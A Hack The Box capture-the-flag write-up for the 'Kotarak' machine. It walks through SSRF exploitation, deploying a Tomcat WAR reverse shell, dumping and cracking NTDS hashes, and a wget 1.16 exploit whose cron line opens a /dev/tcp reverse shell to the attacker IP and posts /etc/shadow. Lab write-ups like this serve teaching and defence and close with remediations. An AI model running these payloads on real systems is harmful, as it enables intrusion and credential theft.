# Kotarak Writeup w/o Metasploit

![](https://miro.medium.com/max/594/1*0zg72N19k-dDC_VwSmQD_A.png)

## Reconnaissance <a id="e095"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
nmapAutomator.sh 10.10.10.55 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.55Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 23:18 EST
Nmap scan report for 10.10.10.55
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8009/tcp open  ajp13
8080/tcp open  http-proxyNmap done: 1 IP address (1 host up) scanned in 2.09 seconds---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 23:18 EST
Nmap scan report for 10.10.10.55
Host is up (0.067s latency).PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS                                                                                                                        
|   Potentially risky methods: PUT DELETE                                                                                                                                      
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html                                                                                                                       
8080/tcp open  http    Apache Tomcat 8.5.5                                                                                                                                     
|_http-favicon: Apache Tomcat                                                                                                                                                  
| http-methods:                                                                                                                                                                
|_  Potentially risky methods: PUT DELETE                                                                                                                                      
|_http-title: Apache Tomcat/8.5.5 - Error report
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.93 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 23:18 EST
Warning: 10.10.10.55 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.55
Host is up (0.076s latency).
All 1000 scanned ports on 10.10.10.55 are open|filtered (740) or closed (260)Nmap done: 1 IP address (1 host up) scanned in 274.87 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 23:22 EST
Initiating Parallel DNS resolution of 1 host. at 23:22
Completed Parallel DNS resolution of 1 host. at 23:22, 0.03s elapsed
Initiating SYN Stealth Scan at 23:22
Scanning 10.10.10.55 [65535 ports]
....
Nmap scan report for 10.10.10.55
Host is up (0.034s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
8009/tcp  open     ajp13
8080/tcp  open     http-proxy
30159/tcp filtered unknown
60000/tcp open     unknownRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 134.40 seconds
           Raw packets sent: 67091 (2.952MB) | Rcvd: 67033 (2.686MB)Making a script scan on extra ports: 60000
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 23:25 EST
Nmap scan report for 10.10.10.55
Host is up (0.032s latency).PORT      STATE SERVICE VERSION
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         Kotarak Web HostingService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.33 seconds---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 23:25 EST
Nmap scan report for 10.10.10.55
Host is up (0.059s latency).PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp  open  http    Apache Tomcat 8.5.5
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.42 secondsRunning Vuln scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 23:26 EST
Nmap scan report for 10.10.10.55
Host is up (0.058s latency).PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
8080/tcp  open  http    Apache Tomcat 8.5.5
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 )
|_  /manager/html: Apache Tomcat (401 )
....
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.55
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.10.55:60000/
|     Form id: 
|_    Form action: url.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /info.php: Possible information file
....
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 544.57 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.55:8080 -o recon/gobuster_10.10.10.55_8080.txt
nikto -host 10.10.10.55:8080 | tee recon/nikto_10.10.10.55_8080.txtgobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.55:60000 -o recon/gobuster_10.10.10.55_60000.txt
nikto -host 10.10.10.55:60000 | tee recon/nikto_10.10.10.55_60000.txtWhich commands would you like to run?                                                                                                                                          
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.55:8080
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/02 23:36:25 Starting gobuster
===============================================================
http://10.10.10.55:8080/docs (Status: 302) [Size: 0]
http://10.10.10.55:8080/examples (Status: 302) [Size: 0]
http://10.10.10.55:8080/favicon.ico (Status: 200) [Size: 21630]
http://10.10.10.55:8080/host-manager (Status: 302) [Size: 0]
http://10.10.10.55:8080/manager (Status: 302) [Size: 0]
===============================================================
2020/02/02 23:37:24 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                               
                                                                                                                                                                               
Starting gobuster scan
                                                                                                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.55:60000
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/02 23:43:19 Starting gobuster
===============================================================
http://10.10.10.55:60000/.hta (Status: 403) [Size: 293]
http://10.10.10.55:60000/.hta.html (Status: 403) [Size: 298]
http://10.10.10.55:60000/.hta.php (Status: 403) [Size: 297]
http://10.10.10.55:60000/.htpasswd (Status: 403) [Size: 298]
http://10.10.10.55:60000/.htpasswd.html (Status: 403) [Size: 303]
http://10.10.10.55:60000/.htpasswd.php (Status: 403) [Size: 302]
http://10.10.10.55:60000/.htaccess (Status: 403) [Size: 298]
http://10.10.10.55:60000/.htaccess.html (Status: 403) [Size: 303]
http://10.10.10.55:60000/.htaccess.php (Status: 403) [Size: 302]
http://10.10.10.55:60000/index.php (Status: 200) [Size: 1169]
http://10.10.10.55:60000/index.php (Status: 200) [Size: 1169]
http://10.10.10.55:60000/info.php (Status: 200) [Size: 92262]
http://10.10.10.55:60000/info.php (Status: 200) [Size: 92262]
http://10.10.10.55:60000/server-status (Status: 403) [Size: 302]
http://10.10.10.55:60000/url.php (Status: 200) [Size: 2]
===============================================================
2020/02/02 23:43:55 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
---------------------Finished all Nmap scans---------------------Completed in 32 minute(s) and 26 second(s)
```

We have four ports open.

* **Port 22:** running OpenSSH 7.2p2
* **Port 8009:** running Apache Jserv
* **Port 8080:** running Apache Tomcat 8.5.5
* **Port 60000:** running Apache httpd 2.4.18

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Port 8080 is running Apache Tomcat and the nmap scan found the _/manager/html_ page, which is the login page to the Manager interface. We’ll have to test that for default credentials. If we do get access to the application we can simply deploy a war file that sends a reverse shell back to our attack machine.
* Port 8009 is running Apache Jserv. This hosts the same functionality as port 8080, with the difference being that port 8080 communicates over HTTP, whereas, port 8009 communicates with the Apache JServ Protocol. So this would be our go to port if port 8080 doesn’t pan out.
* Port 60000 is also running a web server and the gobuster scan discovered the pages _index.php_, _info.php_ and _url.php_. We’ll have to test those pages for LFI, RFI, SSRF and SQLi vulnerabilities depending on what we find out in the enumeration phase.

## Enumeration <a id="22d7"></a>

We’ll start off with enumerating port 8080.

**Port 8080: Apache Tomcat**

Visit the application in the browser.

![](https://miro.medium.com/max/543/1*P7q-dLuMf3CX3U23ViqqoA.png)

We get a 404 error. Next visit the _/manager/html_ page.

![](https://miro.medium.com/max/1217/1*-dUPNlOxiT0BT-JaYdZ2KQ.png)

We get prompted for credentials. I tried the common credentials: _admin/admin_, _admin/password_ and _tomcat/tomcat_ but that didn’t work. Next, I tried the default [Apache Tomcat credentials](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown), but none of them worked. Since this is an off the shelf application that probably has built in brute force protection, I won’t run hydra on it.

For now, let’s move on to enumerating port 60000.

**Port 60000: Apache httpd**

Visit the application in the browser.

![](https://miro.medium.com/max/1339/1*i9kwsaHBcYZX9vVxo3K4RA.png)

It provides a private web search functionality. Let’s see what it is doing when we give it a URL and hit the _Submit_ button.

Right click on the _Submit_ button and select _Inspect Element_.![](https://miro.medium.com/max/60/1*Nqwx847wKQeE1w4FSuUU8Q.png?q=20)![](https://miro.medium.com/max/474/1*Nqwx847wKQeE1w4FSuUU8Q.png)

The form is doing a GET request and passing the path parameter to the _url.php_ script. Let’s enter [www.google.com](http://www.google.com/) and hit submit.

![](https://miro.medium.com/max/691/1*kEHmMeaHfJDtpnbsD6vZoA.png)

The page displays nothing. I tested this out for LFI / RFI vulnerabilities but the application doesn’t seem to be vulnerable. If you’re not familiar with how to test for these type of vulnerabilities refer to the [Poison writeup](https://medium.com/swlh/hack-the-box-poison-writeup-w-o-metasploit-a6acfdf52ac5). Next, let’s try Server Side Request Forgery \(SSRF\) attacks.

SSRF is a type of attack where an attacker abuses a vulnerable functionality of an application by sending crafted requests from the backend server. This can lead to sensitive information disclosure vulnerabilities where you get access to resources that are not otherwise accessible from the external network.

There are many ways to test for SSRF vulnerabilities, of which several of them are listed in [this article](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978). The first thing I usually try is the file URL scheme \(file://\) to view the _/etc/passwd_ file.

![](https://miro.medium.com/max/740/1*GRzrg-zObiwa5YlsGqtgxw.png)

We get a “_try harder_” output message. This leads me to believe that there is some kind of filtering on the “_file_” string. But at least now we know that it is probably vulnerable to SSRF and that we’re on the right track. Next, I tried a couple of the other URI schemas mentioned in the article but nothing worked. So, let’s try and see if we can enumerate services running on the loopback interface \(127.0.0.1\).

![](https://miro.medium.com/max/1299/1*TTyl4DDvXYN3fNqSjd-Gng.png)

Perfect, this proves to us that we are able to enumerate services that are running locally. To test out all the possible ports, intercept the request in Burp and send it to Intruder. In Intruder, click the _Clear_ button to clear all payloads. Then add only the port payload field as the new payload marker.

![](https://miro.medium.com/max/1428/1*YOkr1swubvy9wndpTCIEzQ.png)

Next, select the Payloads sub tab &gt; select the _Payload type_ option to be _Numbers &gt;_ the _Type_ to be _Sequential_ from the range _1_ to _65535._ This will loop through all the possible ports.

![](https://miro.medium.com/max/1418/1*eSpJjk6zA4l7nV2WN5pdYw.png)

Then click _Start attack_. We know that responses with response length 168 give us a blank page indicating that the port is not open.

![](https://miro.medium.com/max/1201/1*ElgqajGpKgTKBhyDD01l_A.png)

So we’re looking for results that give us an output of any other length. Click on the length field to display all the results in descending order.

![](https://miro.medium.com/max/1160/1*J5MBHP0D8nXhICDx9GKXCA.png)

All the above results give us a response length greater than 168. Therefore, something got displayed on those page. Let’s test out port 888.

![](https://miro.medium.com/max/1279/1*52UBtIlxvvHOiydtZ4G_GA.png)

It seems to be hosting some kind of simple file web server. I assume something similar to the python simple server. Let’s look at the backup page.

![](https://miro.medium.com/max/654/1*FgVB99VKNuhe0J7FivlrFw.png)

We get nothing. However, let’s try and include that in the _path_ field that is vulnerable to SSRF.

![](https://miro.medium.com/max/1421/1*kVEIDTGAUcovCz5hKruB5A.png)

We get back a page that contains the tomcat manager’s credentials!

```text
username="admin" password="3@g01PdhB!"
```

Log into the Tomcat Manager Application using the above credentials.

![](https://miro.medium.com/max/1262/1*77hUUHnE60erT02glTZJbA.png)

We’re in! Now all we have to do is generate a malicious war file and upload it through the manager.

## Initial Foothold <a id="a683"></a>

Generate a war file that contains a reverse shell using msfvenom.

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=1234 -f war > shell.war
```

Upload the file on the Tomcat Application Manager and deploy it.

![](https://miro.medium.com/max/779/1*XjAvMJ1rojZEkke9XBXTiw.png)

Set up a listener on the target machine.

```text
nc -nlvp 1234
```

Click on the war file in the Tomcat Application Manager to execute our shell.

![](https://miro.medium.com/max/919/1*IdEmNntSrUG-WS7-31Wj7g.png)

We get a shell! Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(_CTRL+ Z_\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “_fg_” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Unfortunately, we’re running as the user _tomcat_ and we don’t have privileges to view the _user.txt_ flag.

Let’s view the content of the directory we’re in.

```text
tomcat@kotarak-dmz:/$ ls -la
total 109
drwxr-xr-x  27 root root  4096 Aug 29  2017 .
drwxr-xr-x  27 root root  4096 Aug 29  2017 ..
drwxr-xr-x   3 root root  4096 Jul 21  2017 backups
drwxr-xr-x   2 root root  4096 Jul  9  2017 bin
drwxr-xr-x   4 root root  1024 Aug 29  2017 boot
drwxr-x---   3 root root  4096 Jul 19  2017 .config
drwxr-xr-x  20 root root  3980 Feb  7 06:09 dev
drwxr-xr-x 105 root root  4096 Jan 18  2018 etc
....
```

View the content of the _backup_ directory.

```text
tomcat@kotarak-dmz:/$ cd backups/backups/tomcat@kotarak-dmz:/backups/backups$ ls
tomcat-users.xmltomcat@kotarak-dmz:/backups/backups$ cat tomcat-users.xml 
cat: tomcat-users.xml: Permission denied
```

We don’t have permission. Next, view the content of _tomcat_’s home directory.

```text
tomcat@kotarak-dmz:/backups/backups$ cd /hometomcat@kotarak-dmz:/home$ ls
atanas  tomcattomcat@kotarak-dmz:/home$ cd tomcat/to_archive/pentest_data/tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
```

The _pentest\_data_ directory seems to contain the ntds.dit and SYSTEM registry hive files. We can use these files to extract Active Directory password hashes. First, let’s confirm the file types.

```text
tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ file *
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit: data
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
```

Next, transfer these files to our attack machine. Set up a python server on the target machine.

```text
python -m SimpleHTTPServer 5555
```

Then download the files on the target machine.

```text
wget http://10.10.10.55:5555/20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.ditwget http://10.10.10.55:5555/20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
```

Use [Impacket’s secretdump script](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to extract passwords.

```text
impacket-secretsdump -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit LOCAL
```

This gives us a dump of hashes of which only two are of interest to us.

```text
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.ditAdministrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
...
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

Extract the hashes and crack them using [CrackStation](https://crackstation.net/).

```text
e64fe0f24ba2489c05e64354d74ebd11
31d6cfe0d16ae931b73c59d7e0c089c0
2b576acbe6bcfda7294d6bd18041b8fe
```

It cracked both passwords.

![](https://miro.medium.com/max/830/1*j_9UQv2PNhml1sBo-tWgMw.png)

Let’s try su-ing into _atanas_’s account using the password “_Password123!_”. It doesn’t work. Next, let’s try the _administrator_’s password.

```text
tomcat@kotarak-dmz:/$ su - atanas
Password: 
atanas@kotarak-dmz:~$
```

We’re in! Grab the _user.txt_ flag.

![](https://miro.medium.com/max/468/1*jj2OAspRgjAFhqtOsZzBvg.png)

Now we need to escalate our privileges to root.

## Privilege Escalation <a id="7166"></a>

View the content of the root directory.

```text
atanas@kotarak-dmz:~$ cd /root/
atanas@kotarak-dmz:/root$ ls -la
total 48
drwxrwxrwx  6 root   root 4096 Sep 19  2017 .
drwxr-xr-x 27 root   root 4096 Aug 29  2017 ..
-rw-------  1 atanas root  333 Jul 20  2017 app.log
-rw-------  1 root   root  499 Jan 18  2018 .bash_history
-rw-r--r--  1 root   root 3106 Oct 22  2015 .bashrc
drwx------  3 root   root 4096 Jul 21  2017 .cache
drwxr-x---  3 root   root 4096 Jul 19  2017 .config
-rw-------  1 atanas root   66 Aug 29  2017 flag.txt
-rw-------  1 root   root  188 Jul 12  2017 .mysql_history
drwxr-xr-x  2 root   root 4096 Jul 12  2017 .nano
-rw-r--r--  1 root   root  148 Aug 17  2015 .profile
drwx------  2 root   root 4096 Jul 19  2017 .ssh
```

We own the _app.log_ and _flag.txt_ files. Let’s view the _flag.txt_ file.

```text
atanas@kotarak-dmz:/root$ cat flag.txt 
Getting closer! But what you are looking for can't be found here.
```

View the _app.log_ file.

```text
atanas@kotarak-dmz:/root$ cat app.log 
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
```

It seems like the IP address 10.0.3.133 is making a GET request to port 80 \(default port if it is not specified\) to our target machine every 2 minutes. The wget version used is 1.16 which we know from the [Falafel machine](https://medium.com/@ranakhalil101/hack-the-box-falafel-writeup-w-o-metasploit-22778580d309), is vulnerable to an arbitrary file upload vulnerability. Since the log of this cron job is saved in the root directory, then we can assume that the cron job might be running with root privileges. If so, we’ll use this vulnerability to escalate our privileges to root.

First, let’s confirm that the cron job does run every two minutes.

```text
atanas@kotarak-dmz:/$ nc -nlvp  80
nc: Permission denied
```

We get a permission denied error because we’re not allowed to bind to ports less than 1024 without root privileges. So let’s see if _authbind_ is installed on this box.

```text
atanas@kotarak-dmz:/$ locate authbind
/etc/authbind
...atanas@kotarak-dmz:/$ ls -la /etc | grep authbind
drwxr-xr-x   5 root root    4096 Aug 29  2017 authbind
```

Perfect, it is installed and we have execute privileges to it. What this program does is it allows a program which does not have root privileges to bind to low-numbered ports.

Rerun the netcat command using _authbind_.

```text
atanas@kotarak-dmz:/$ authbind nc -nlvp 80
Listening on [0.0.0.0] (family 0, port 80)
Connection from [10.0.3.133] port 80 [tcp/*] accepted (family 2, sport 60200)
GET /archive.tar.gz HTTP/1.1
User-Agent: Wget/1.16 (linux-gnu)
Accept: */*
Host: 10.0.3.1
Connection: Keep-Alive
```

We get a hit back from 10.0.3.133 confirming that it is a cron job that is running every two minutes.

Now let’s run our exploit. View the exploit instructions on [exploitdb](https://www.exploit-db.com/exploits/40064). There’s a couple of steps we need to do.

First, prepare a malicious _.wgetrc_ file on your attack machine.

```text
cat <<_EOF_>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_
```

Second, start up an FTP server in the directory that the ._wgetrc_ file resides in.

```text
python -m pyftpdlib -p21 -w
```

Third, copy the exploit and save it in the file _wget-exploit.py_. Change the configuration to send a reverse shell back to your attack machine.

```text
HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.14.12'
FTP_PORT = 21ROOT_CRON = "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.12/6666 0>&1' \n"
```

Then transfer the exploit to the attack machine and run it.

```text
authbind python wget-exploit.py
```

Setup a listener on the attack machine and wait a couple of minutes for the exploit to completely run.

```text
root@kali:~/Desktop/htb/kotarak/wget-exploit# nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.55] 54282
```

We get a shell! If you run the ifconfig command, you’ll see that we’ve pivoted to the 10.0.3.133 box and now are running with root privileges.

```text
root@kotarak-int:~# /sbin/ifconfig                                                                           
/sbin/ifconfig                                                                                               
eth0      Link encap:Ethernet  HWaddr 00:16:3e:c9:bd:b1                                                      
          inet addr:10.0.3.133  Bcast:10.0.3.255  Mask:255.255.255.0                                         
          inet6 addr: fe80::216:3eff:fec9:bdb1/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1566 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1558 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:91989 (91.9 KB)  TX bytes:101232 (101.2 KB)lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)root@kotarak-int:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Grab the root.txt flag.

![](https://miro.medium.com/max/491/1*L25Eax45y8UND3jmYZtOjA.png)

**Alternative Solution**

There’s an alternative easier solution to solving this box. If you run the id command, you’ll see that the _atanas_ user is part of the disk group.

```text
atanas@kotarak-dmz:/tmp$ id
uid=1000(atanas) gid=1000(atanas) groups=1000(atanas),4(adm),6(disk),24(cdrom),30(dip),34(backup),46(plugdev),115(lpadmin),116(sambashare)
```

We know from the [Falafel box](https://medium.com/@ranakhalil101/hack-the-box-falafel-writeup-w-o-metasploit-22778580d309) that that essentially gives the user full access to any block devices contained within _/dev/_. Having access to this is almost equivalent to having root privileges. Refer to the Falafel writeup to see how you can use this misconfiguration to escalate privileges.

## Lessons Learned <a id="aa0a"></a>

To gain an initial foothold on the box we exploited four vulnerabilities.

1. Server Side Request Forgery \(SSRF\). The application was vulnerable to an SSRF vulnerability that allowed us to enumerate services running locally and eventually gave us access to a file that contains cleartext credentials. Remediations for this vulnerability include input validation, proper response handling and disabling unused URL schemas.
2. Cleartext credentials. One of the internal services was running a simple file viewer that gave us access to file that contains the Tomcat Application Manager’s credentials. This allowed us to access the Tomcat Manager interface, upload a malicious war file and gain initial access on the machine. Sensitive information should not be stored in cleartext and permission restrictions should be put in place that prevent an unauthorized user from accessing files that contain sensitive information.
3. Sensitive Information Disclosure. The _tomcat_ directory contained left over results from a penetration test that included the ntds.dit and SYSTEM registry hive files. We used these file to extract Active Directory password hashes. Again, permission restrictions should be put in place to prevent unauthorized users from accessing files that contain sensitive information.
4. Weak credentials that are not salted. The password hashes we extracted from the ntds.dit file and SYSTEM registry hive, were cracked in a matter of seconds using an online password cracker. This allowed us to pivot to the user _atanas_. The user should have used a strong password that is difficult to crack.

To escalate privileges we exploited one vulnerability.

1. Known arbitrary file upload vulnerability in the wget version that was being used. Since a wget request was running as a cron job with root privileges, we were able to exploit this vulnerability to escalate our privileges to root. This could have been avoided if the administrator used the patched version of the wget program.

